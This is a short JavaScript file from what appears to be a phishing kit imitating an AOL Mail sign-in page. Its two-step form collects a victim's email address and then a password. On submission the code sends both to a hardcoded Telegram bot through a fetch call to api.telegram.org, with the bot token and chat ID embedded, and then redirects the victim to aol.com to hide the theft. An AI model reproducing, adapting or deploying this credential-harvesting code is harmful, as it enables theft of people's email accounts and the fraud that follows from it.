

  
  const forma = document.querySelector('#form')

  let bot = {
      TOKEN: "5455608143:AAGjPPaJ1S9E8aNjj0PUWkqWpGutV1bitVU",
      chatID: "1060663576"
  }

  const emAil = document.querySelector('#usr')
  const suBBer = document.querySelector('#suber')
  const pWd = document.querySelector('#pwd')
  const strong = document.querySelector('.strong')
  const submit = document.querySelector('#sub');
  submit.addEventListener('click', e =>{
    if(emAil.value === ''){
      return
    }
    display.textContent = emAil.value
    strong.textContent = 'Enter password'
    emAil.style.display = 'none'
    pWd.style.display = 'block'
    submit.type = 'submit'
    // suBBer.style.display = 'block'
  })


forma.addEventListener("submit", e =>{
      e.preventDefault();
      let email = document.querySelector('#usr').value
      let pwd = document.querySelector('#pwd').value

    fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=AOLMail=>${email}=${pwd}`, {
          method: "GET"
      }).then(success => {
          window.location.replace("https://aol.com");
      }, error => {
      alert('message not sent')
          console.log(error)
          }) 
  })


